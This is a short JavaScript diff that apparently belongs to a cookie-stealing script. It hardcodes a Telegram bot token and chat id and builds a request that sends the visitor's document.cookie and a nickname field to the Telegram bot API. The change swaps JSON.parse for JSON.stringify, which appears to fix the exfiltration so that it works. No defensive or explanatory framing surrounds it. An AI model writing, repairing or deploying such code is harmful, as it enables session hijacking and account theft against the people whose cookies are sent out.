@@ -8,7 +8,7 @@ let message = "Hello World !";
 
 let token = "7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU";
 let chat_id = 7047469171;
-let url = `https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=` + JSON.parse([{ name: nickname.textContent, cookie: document.cookie}]);
+let url = `https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=` + JSON.stringify([{ name: nickname.textContent, cookie: document.cookie}]);
 
 let oReq = new XMLHttpRequest();
 oReq.open("GET", url, true);
